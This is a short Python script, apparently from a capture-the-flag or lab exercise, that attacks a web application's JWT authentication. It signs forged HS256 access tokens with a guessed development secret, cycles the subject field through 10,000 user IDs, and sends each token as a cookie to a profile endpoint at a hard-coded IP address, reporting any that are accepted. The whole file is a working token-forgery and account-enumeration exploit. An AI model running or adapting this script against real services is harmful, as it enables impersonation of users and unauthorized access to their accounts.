import requests
import jwt

burp0_url = "http://45.56.116.251:5050/profile"
burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.82", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://45.56.116.251:5050/login", "Accept-Encoding": "gzip, deflate", "Accept-Language": "vi,en-US;q=0.9,en;q=0.8", "Connection": "close"}

def create_jwt(payload, secret_key):
    header = {"typ": "JWT", "alg": "HS256"}
    jwt_token = jwt.encode(payload, secret_key, algorithm="HS256", headers=header)
    return jwt_token

for _ in range(10000):  
    payload_data = {
                    "fresh": False,
                    "iat": 1689960056,
                    "jti": "51156053-531f-4fe9-a133-ffaece1ef987",
                    "type": "access",
                    "sub": _,
                    "nbf": 1689960056,
                    "exp": 1689960956
                    }
    secret_key = "this_is_a_dev_secret"

    jwt_token = create_jwt(payload_data, secret_key)
    burp0_cookies = {"access_token_cookie": jwt_token}
    res = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    print(res.status_code)
    if res.status_code == 200:
        print(f"[::]Found {jwt_token}")